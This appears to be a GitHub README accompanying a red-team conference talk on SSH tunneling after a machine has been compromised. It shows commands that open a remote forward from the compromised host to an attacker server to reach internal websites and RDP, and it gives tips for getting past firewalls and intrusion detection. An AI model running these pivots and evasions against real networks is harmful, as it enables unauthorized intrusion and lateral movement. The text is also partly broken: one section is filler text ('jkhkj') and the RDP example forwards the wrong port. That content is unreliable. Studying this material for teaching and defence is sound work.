![fenrir-desktop-bg](https://user-images.githubusercontent.com/8293038/133816238-7152221b-c37d-46ca-831d-ff636178f44f.png)

## SSH Tunnels: Creating Reverse Proxies and Evading Network Detection

This repo is supplemental material for my presentation for [Red Team Village](https://redteamvillage.io) during Hackerone's Hacktivitycon2021. If you have any questions or just want to talk get in touch with me:

- [Twitter](https://twitter.com/cwolff411)
- [Discord](https://discordapp.com/users/354713402733494283)
- [LinkedIn](https://linkedin.com/in/corywolff)
- Email me at yxakl5mae@relay.firefox.com

## Abstract
SSH tunneling is a valuable component of the red teamer's toolkit when used correctly - but that's the hard part. Demystifying reverse port forwards, local port forwards, and dynamic port forwards can be a challenge for any operator. This talk will begin with the basics of SSH tunneling and then focus on ways to utilize them to create reverse proxies and evade network monitoring during an engagement. It aims to provide clarity on the use of these different port forwards and provide examples on how to use them in an offensive security scenario.

## Things to Know
Everything in this discussion is based around post-exploitation scenarios, meaning that you have already landed on a machine, escalated privileges, and are looking to move throughout the network.

### Gateway Ports
In order to access the open ports on your attack server which are then forwarded through SSH on your compromised host, you must enable Gateway Ports in the attack servers `sshd_config`. By default, SSH will only allow connections to the loopback interface on your attack server.

To enable Gateway Ports open `/etc/ssh/sshd_config` and look for the line that says `#GatewayPorts = no`. Remove the `#` and change it to yes. 

When complete, save the file and restart the SSH daemon. On Debian based systems:

`systemctl restart sshd`

## Dynamic Port Forwards
![RTV-SSH Tunnels-Dynamic Port Forward](https://user-images.githubusercontent.com/8293038/133801798-35120a05-e2cf-468c-89b7-3730d65c1a0f.png)

Opens a local port on the client. Any connections made to that port are routed through the SSH tunnel and exits on the server applicable server port depending on the application data. Good way to make a simple SOCKS proxy.

`ssh -D YOUR_LOCAL_PORT username@server`


## Local Port Forwards
![Red Team Village SSH Tunnels Local](https://user-images.githubusercontent.com/8293038/133802535-3488de3a-f2ca-4ab9-bed0-71694c090866.png)

Listens on a specified local port and forwards incoming data through SSH and out the specified remote port. Similar in nature to using a dynamic port forward, with the primary differences:
- Uses the -L flag
- With local port forwarding you can specify the remote port to be used. With dynamic port forwarding, this is handled by SSH

`ssh -L LOCAL_PORT:SELECTED_HOST:REMOTE_PORT`


## Remote Port Forwards
![Red Team Village SSH Tunnels Remote](https://user-images.githubusercontent.com/8293038/133802536-14b4f4df-e60e-4e0a-8a6f-6ddf9b29c118.png)

jkhkj

## Create Pivot Tunnels
![Red Team Village SSH Tunnel Pivot](https://user-images.githubusercontent.com/8293038/133802533-83e88f3a-dd2e-469e-80a4-74bfda580fec.png)

What if we wanted to connect to an internal host running RDP and we have credentials to log in? What if we wanted to browse internal websites? Can't use shell for GUI apps. Using a combination of a dynamic port forward and a remote port forward we can connect to our attack server and route traffic through the compromised host into the internal network.


![Red Team Village SSH Tunnel Close Up Look](https://user-images.githubusercontent.com/8293038/133802532-6270d38e-533e-4334-9e77-98b459cc371e.png)

First create a dynamic port forward on the localhost(compromised machine), then create a remote port forward using that same local port and the selected port on your attack server. You should then be able to set your proxy as your attack server and port, and traverse the internal network.

### Example: Browse Internal Websites

On the compromised host:
`ssh -D 80 -N -f username@localhost`
`ssh -R 54321:localhost:80 root@attack-server`

Using the `-N` and `-f` flags do two things. First the `-N` flag tells SSH that no commands will be sent in the session. Second, the `-f` flag tells SSH to drop to the background. This keeps our terminal clean and keeps us on the command line ready to setup our remote port forward.

You now have a proxy to use for internal port forwarding at `attack-server:54321`

Using proxychains or simply setting the proxy in your browser settings, you can now browse internal websites through your attack machine's browser.

### Example: Connect to Internal RDP Hosts

On the compromised host:
`ssh -D 3389 -N -f username@localhost`
`ssh -R 54321:localhost:80 root@attack-server`

This example is very similar to the previous example except this time you use port `3389` for RDP.

Add your attack server to `/etc/proxychains.conf`:

`socks5	attack-server	54321`

Then use proxychains with `xfreerdp` or your RDP client of choice and you can now connect to that internal host via RDP:

`proxychains xfreerdp /u:fenrir /p:password /v:HOST_IP`

## Evading Detection
Depending on the firewall and IDS/IPS in place, there are a few ways to avoid detection:

- First, try a non-traditional port like `443`. If the monitoring and firewall are basic setups, then simply using a port other than `22` will avoid detection.
- Setup an SSL tunnel to then route your SSH traffic through. SSH uses `encrypt-then-mac` whereas SSL uses `mac-then-encrypt`. Deep packet inspection will not be able to see that it's actually SSH traffic going over the wire. There are some caveats to this though, so make sure to check out the `stunnel` folder in this repo.
- When all else fails try IPv6. The transition to IPv6 has been slow and arduous. Many networks/firewalls/servers/etc support it, but the implementation is less than perfect. Everyone says they know how it all works, but they lie :)

## Fin
Thanks to [Red Team Village](https://redteamvillage.io) for having me during their Hacktivitycon event.

SSH tunnels are an excellent way to use living off the land binaries to pivot and move laterally throughout a network. It took me awhile to wrap my head around all of the options, so I hope this was helpful.

### More Info

- Check out everything you can do with SSH. It's more than just shell access. Read the [manual](https://linux.die.net/man/1/ssh).
- [sshuttle](https://github.com/sshuttle/sshuttle)